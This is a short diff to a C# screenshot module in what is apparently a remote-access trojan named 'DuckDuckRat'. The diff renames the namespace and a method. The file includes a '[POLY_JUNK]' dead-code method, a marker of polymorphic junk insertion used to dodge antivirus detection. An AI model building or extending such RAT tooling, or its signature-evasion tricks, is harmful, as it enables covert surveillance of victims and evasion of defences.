@@ -2,7 +2,7 @@ using System;
 using System.IO;
 using System.Runtime.InteropServices;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     /// <summary>
     /// Screenshot via pure GDI32/User32 P/Invoke — zero WinForms dependency.
@@ -11,7 +11,7 @@ namespace FinalBot.Modules
     public static class ScreenshotModule
     {
         // [POLY_JUNK]
-        private static void _vanguard_81bcca45() {
+        private static void _DuckDuckRat_81bcca45() {
             int val = 13525;
             if (val > 50000) Console.WriteLine("Hash:" + 13525);
         }
@@ -131,3 +131,5 @@ namespace FinalBot.Modules
         }
     }
 }
+
+
